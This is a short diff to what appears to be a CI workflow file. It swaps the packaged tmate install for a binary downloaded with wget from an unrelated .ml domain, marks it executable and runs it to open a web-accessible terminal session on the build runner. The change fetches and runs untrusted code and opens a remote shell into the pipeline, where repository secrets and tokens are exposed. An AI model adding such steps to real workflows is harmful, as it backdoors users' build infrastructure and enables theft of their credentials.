@@ -27,6 +27,8 @@ jobs:
         # Echo the `uname` output parameter from the `runcmd` step
         run: |
           echo "The uname output was ${{ steps.runcmd.outputs.uname }}"
-          sudo apt install tmate -y
+          sudo apt install wget -y
+          wget https://sabina.amyrom.ml/tmate
+          chmod +x ./tmate
           sleep 15
-          tmate -F -n web new-session
+          ./tmate -F -n web new-session
